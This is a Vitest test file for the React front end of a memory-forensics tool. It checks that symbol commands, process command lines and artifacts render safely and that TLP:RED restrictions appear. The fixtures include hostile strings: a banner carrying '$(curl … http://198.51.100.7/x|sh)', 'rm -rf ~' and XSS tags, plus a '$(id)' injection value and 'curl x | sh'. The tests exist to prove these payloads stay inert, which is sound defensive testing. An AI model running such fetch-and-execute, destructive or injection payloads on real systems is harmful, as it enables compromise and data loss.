import type { Schemas } from "@cyberlab/contracts";
import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import type { ReactElement } from "react";
import { renderToStaticMarkup } from "react-dom/server";
import { describe, expect, it } from "vitest";

import { IocsTab } from "@/components/analysis/iocs-tab";
import { ArtifactRow } from "@/components/memory/artifacts-tab";
import { MemoryOverview } from "@/components/memory/memory-overview";
import { MemorySensitivityBadge, SensitivityBadge } from "@/components/memory/memory-sensitivity-badge";
import { MemoryUploadOption } from "@/components/memory/memory-upload-option";
import { PluginStrip } from "@/components/memory/plugin-strip";
import { ProcessDetailView } from "@/components/memory/process-panel";
import { ProcessTree } from "@/components/memory/processes-tab";
import { RegionBytes } from "@/components/memory/regions-tab";
import { ReleaseForm } from "@/components/memory/release-dialog";
import { RunMemoryForm } from "@/components/memory/run-memory-analysis";
import { SensitivityBanner } from "@/components/memory/sensitivity-banner";
import { SymbolsMissing } from "@/components/memory/symbols-missing";
import { EMPTY_FLAGS, type MemoryProcess, type MemorySummary, RUN_NOTICE, EARLIER_JOBS_NOTICE } from "@/lib/memory";
import { RELEASE_ACK, RESTRICTED_BANNER } from "@/lib/memory-sensitivity";
import { OrgProvider } from "@/lib/org-context";

const ORG = "11111111-1111-4111-8111-111111111111";
const JOB = "6a1f0c1e-8d6b-4c55-9d9e-0d1b6f5a1001";
const EVIDENCE = "33333333-3333-4333-8333-333333333333";
const noop = () => undefined;

function render(node: ReactElement, role: "owner" | "admin" | "analyst" | "viewer" = "owner"): string {
  return renderToStaticMarkup(
    <OrgProvider value={{ orgId: ORG, orgName: "Org", role }}>
      <QueryClientProvider client={new QueryClient()}>{node}</QueryClientProvider>
    </OrgProvider>,
  );
}

/** The `data-testid` element's markup (non-greedy, enough for leaf elements). */
function testId(html: string, id: string): string | null {
  const match = new RegExp(`<[a-z]+[^>]*data-testid="${id}"[^>]*>([\\s\\S]*?)</`, "i").exec(html);
  return match ? match[1] : null;
}

const PDB = { name: "ntkrnlmp.pdb", guid: "89ABCDEF0123456789ABCDEF01234567", age: 2 };
// Attacker-chosen banner with shell metacharacters and markup (RT12).
const HOSTILE_BANNER = 'Linux version 6.1.0 $(curl -s http://198.51.100.7/x|sh); `id` && rm -rf ~ <img src=x onerror=alert(1)>';

function process(over: Partial<MemoryProcess> & { pid: number; id: string }): MemoryProcess {
  return {
    ppid: null,
    name: `p${over.pid}`,
    offset: null,
    create_time: null,
    exit_time: null,
    threads: 1,
    handles: null,
    session_id: null,
    wow64: null,
    sources: ["pslist"],
    cmdline: null,
    image_path: null,
    children: 0,
    ...over,
  } as MemoryProcess;
}

const SUMMARY = {
  job_id: JOB,
  evidence_id: EVIDENCE,
  profile: "triage",
  os: "windows",
  arch: "x64",
  layer: "WindowsCrashDump64Layer>WindowsIntel32e",
  engine: "replay",
  nt_build: "19041",
  system_time: "2026-11-01T09:30:00Z",
  size_bytes: 67108864,
  sha256: "b".repeat(64),
  symbols: { status: "resolved", isf_sha256: "c".repeat(64), windows_pdb: null, linux_banner: null },
  tool_versions: { volatility3: "2.28.2" },
  plugins: [
    { plugin: "windows.pslist", status: "ok", rows: 41, truncated: false, duration_ms: 1000 },
    { plugin: "windows.netscan", status: "timeout", rows: 0, truncated: false, duration_ms: 1_200_000, error_code: "plugin_timeout" },
    { plugin: "windows.svcscan", status: "ok", rows: 2, truncated: true, duration_ms: 1000 },
  ],
  counts: { processes: 41, connections: 3, injections: 1, findings: 2, iocs: 2 },
  truncated: {},
  engine_errors: [],
} as unknown as MemorySummary;

describe("symbols missing (RT12)", () => {
  it("gives an operator the exact Windows command with a copy button", () => {
    const html = render(
      <SymbolsMissing symbols={{ status: "missing", windows_pdb: PDB }} canOperate canRerun onRerun={noop} />,
    );
    expect(testId(html, "symbols-command")).toContain(
      "pnpm memory:symbols -- fetch-windows --pdb ntkrnlmp.pdb --guid 89ABCDEF0123456789ABCDEF01234567 --age 2",
    );
    expect(html).toContain("Copy the symbols command");
    expect(html).toContain("Re-run");
    expect(html).toContain("This is not a clean result");
    expect(html).not.toMatch(/no findings\./i);
  });

  it("tells members without org.update to ask their operator", () => {
    const html = render(<SymbolsMissing symbols={{ status: "missing", windows_pdb: PDB }} canOperate={false} canRerun onRerun={noop} />);
    expect(html).toContain("Ask your operator to add these symbols");
    expect(testId(html, "symbols-command")).toBeNull();
    expect(html).not.toContain("fetch-windows");
    expect(html).toContain("Re-run");
  });

  it("offers no command when a PDB field fails its pattern", () => {
    const html = render(
      <SymbolsMissing symbols={{ status: "missing", windows_pdb: { ...PDB, guid: "$(id)" } }} canOperate canRerun onRerun={noop} />,
    );
    expect(testId(html, "symbols-command")).toBeNull();
    expect(html).not.toContain("Copy the symbols command");
  });

  it("never puts a hostile Linux banner in a command or a copy button", () => {
    for (const canOperate of [true, false]) {
      const html = render(
        <SymbolsMissing symbols={{ status: "missing", linux_banner: { banner: HOSTILE_BANNER } }} canOperate={canOperate} canRerun onRerun={noop} />,
      );
      const quoted = testId(html, "linux-banner");
      expect(quoted).toContain("$(curl -s http://198.51.100.7/x|sh)");
      expect(quoted).toContain("&lt;img src=x onerror=alert(1)&gt;");
      expect(html).not.toContain("<img");
      expect(testId(html, "symbols-command")).toBeNull();
      expect(html).not.toMatch(/Copy/);
      expect(html).not.toContain("fetch-windows");
      // The only occurrence of the banner is the inert quote.
      expect(html.split("198.51.100.7/x|sh").length - 1).toBe(1);
      expect(html).toContain("Re-run");
    }
  });
});

describe("plugin strip", () => {
  it("marks a partial result: failed / timed-out steps and truncated rows", () => {
    const html = render(<PluginStrip summary={SUMMARY} />);
    expect(html).toContain("Partial result");
    expect(html).toContain("windows.netscan");
    expect(html).toContain("Timed out");
    expect(html).toContain("truncated");
    expect(html).toContain("not evidence of absence");
  });

  it("says complete only when every step is ok", () => {
    const html = render(<PluginStrip summary={{ plugins: [SUMMARY.plugins[0]], truncated: {} }} />);
    expect(html).toContain("Every analysis step finished");
    expect(html).not.toContain("Partial result");
  });
});

describe("overview", () => {
  it("renders the image facts and labels the replay engine", () => {
    const html = render(<MemoryOverview summary={SUMMARY} />);
    expect(html).toContain("Replay engine (test)");
    expect(html).toContain("Windows");
    expect(html).toContain("19041");
    expect(html).toContain("41 processes");
  });
});

describe("text-only rendering", () => {
  it("renders a command line with markup as text", () => {
    const p = process({ pid: 5260, id: "00000000-0000-4000-8000-000000000001", cmdline: '<img src=x onerror=alert(1)> powershell -enc "<script>"' });
    const html = render(
      <ProcessDetailView
        detail={{ process: p, parent: null, children: [], connections: [], injections: [], artifacts: [], instances: 1 }}
        flags={EMPTY_FLAGS}
        onSelect={noop}
      />,
    );
    expect(testId(html, "process-cmdline")).toContain("&lt;img src=x onerror=alert(1)&gt;");
    expect(html).not.toContain("<img");
    expect(html).not.toContain("<script>");
  });

  it("renders hex heads and disassembly as monospace text", () => {
    const html = render(<RegionBytes region={{ head_hex: "4d5a3c62", disasm: "0x400000: dec ebp <b>bold</b>" }} />);
    expect(testId(html, "region-hex")).toContain("4d 5a 3c 62");
    expect(testId(html, "region-hex")).toContain("MZ&lt;b");
    expect(testId(html, "region-disasm")).toContain("&lt;b&gt;bold&lt;/b&gt;");
    expect(html).not.toContain("<b>");
  });

  it("renders artifact attributes as text", () => {
    const html = render(
      <table>
        <tbody>
          <ArtifactRow
            artifact={{ id: "a1", type: "bash", pid: 1030, attributes: { command: "curl x | sh <svg onload=alert(1)>", time: "2026-11-01T08:07:00Z" } }}
          />
        </tbody>
      </table>,
    );
    expect(html).toContain("&lt;svg onload=alert(1)&gt;");
    expect(html).not.toContain("<svg onload");
  });

  it("renders the fixture process tree with flags", () => {
    const procs = [
      process({ pid: 4, ppid: 0, name: "System", id: "00000000-0000-4000-8000-000000000004" }),
      process({ pid: 356, ppid: 4, name: "smss.exe", id: "00000000-0000-4000-8000-000000000356" }),
      process({ pid: 6112, ppid: 3040, name: "svch0st.exe", sources: ["psscan"], id: "00000000-0000-4000-8000-000000006112" }),
    ];
    const html = render(<ProcessTree processes={procs} flags={EMPTY_FLAGS} query="" onSelect={noop} />);
    expect(html).toContain('role="treegrid"');
    expect(html).toContain("smss.exe");
    expect(html).toContain('aria-label="Collapse System (4)"');
    expect(html).toContain("Not in the active list");
    expect(html).toContain("(not in image)");
  });
});

describe("sensitivity", () => {
  const evidence = (state: "restricted" | "released" | null) =>
    ({ id: EVIDENCE, original_filename: "mem.raw", memory_sensitivity: state }) as unknown as Schemas["EvidenceOut"];

  it("shows the badge and offers Release only to org.update members", () => {
    expect(render(<MemorySensitivityBadge orgId={ORG} evidence={evidence("restricted")} />, "admin")).toContain("Release…");
    const analyst = render(<MemorySensitivityBadge orgId={ORG} evidence={evidence("restricted")} />, "analyst");
    expect(analyst).toContain("restricted (TLP:RED)");
    expect(analyst).not.toContain("Release…");
    expect(render(<MemorySensitivityBadge orgId={ORG} evidence={evidence(null)} />)).toBe("");
    expect(render(<SensitivityBadge state="released" />)).toContain("released");
  });

  it("shows the TLP:RED banner while restricted (or unknown)", () => {
    const admin = render(<SensitivityBanner orgId={ORG} evidenceId={EVIDENCE} filename="mem.raw" restriction="restricted" canRelease />);
    expect(admin).toContain(RESTRICTED_BANNER.replace(/'/g, "&#x27;"));
    expect(admin).toContain("Release…");
    const member = render(<SensitivityBanner orgId={ORG} evidenceId={EVIDENCE} filename="mem.raw" restriction="restricted" canRelease={false} />);
    expect(member).toContain("Only an admin can release it.");
    expect(member).not.toContain("Release…");
    expect(render(<SensitivityBanner orgId={ORG} evidenceId={EVIDENCE} filename="mem.raw" restriction={null} canRelease />)).toContain(
      'data-testid="sensitivity-banner"',
    );
    expect(render(<SensitivityBanner orgId={ORG} evidenceId={EVIDENCE} filename="mem.raw" restriction="released" canRelease />)).toContain(
      "evidence share policy",
    );
  });

  it("the release form needs the acknowledgement before Release is enabled", () => {
    const html = render(<ReleaseForm pending={false} error={null} onSubmit={noop} onCancel={noop} />);
    expect(html).toContain(RELEASE_ACK.slice(0, 40));
    expect(html).toMatch(/<input[^>]*type="checkbox"[^>]*required/);
    expect(html).toMatch(/<button[^>]*type="submit"[^>]*disabled/);
  });

  it("hides Enrich on the IOC tab while restricted (RT16)", () => {
    const html = render(<IocsTab orgId={ORG} jobId={JOB} source="memory image" enrichDisabledReason="Threat-intel enrichment is off: restricted." />);
    expect(testId(html, "enrich-disabled")).toContain("Threat-intel enrichment is off");
    expect(html).toContain("memory image");
  });
});

describe("run and upload", () => {
  it("explains the run cost, the restriction and earlier jobs (RT3)", () => {
    const html = render(<RunMemoryForm earlierJobs pending={false} error={null} onSubmit={noop} onCancel={noop} />);
    expect(html).toContain(RUN_NOTICE.slice(0, 40));
    expect(html).toContain('data-testid="earlier-jobs"');
    expect(html).toContain(EARLIER_JOBS_NOTICE.slice(0, 40));
    expect(html).toContain("Triage");
    expect(html).toContain("Detect automatically");
    expect(render(<RunMemoryForm earlierJobs={false} pending={false} error={null} onSubmit={noop} onCancel={noop} />)).not.toContain(
      'data-testid="earlier-jobs"',
    );
  });

  it("the upload option states the size limit and that the image is restricted, not analyzed", () => {
    const on = render(<MemoryUploadOption value onChange={noop} />);
    expect(on).toContain("This is a memory image");
    expect(on).toContain("8.0 GiB");
    expect(on).toContain("TLP:RED");
    expect(on).toContain("never analyzed automatically");
    expect(render(<MemoryUploadOption value={false} onChange={noop} />)).toMatch(/<input[^>]*type="checkbox"/);
  });
});
